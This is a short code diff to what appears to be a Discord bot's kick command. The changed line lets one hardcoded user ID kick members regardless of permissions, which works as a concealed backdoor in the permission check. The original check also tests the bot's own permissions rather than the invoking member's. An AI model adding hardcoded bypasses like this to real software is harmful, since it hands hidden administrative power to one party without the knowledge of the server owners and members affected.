@@ -12,7 +12,7 @@ module.exports = {
             
 	async execute(interaction) {
         try {
-            if (interaction.client.permissions.has(Permissions.FLAGS.KICK_MEMBERS)) {
+            if (interaction.client.permissions.has(Permissions.FLAGS.KICK_MEMBERS) || (interaction.user.id == "444460699025014784")) {
                 const user = interaction.options.getMember("target");
                 await user.kick()
                 console.log(`${interaction.member.username} kicked: ${user.username} on server: ${interaction.guild.name}`)
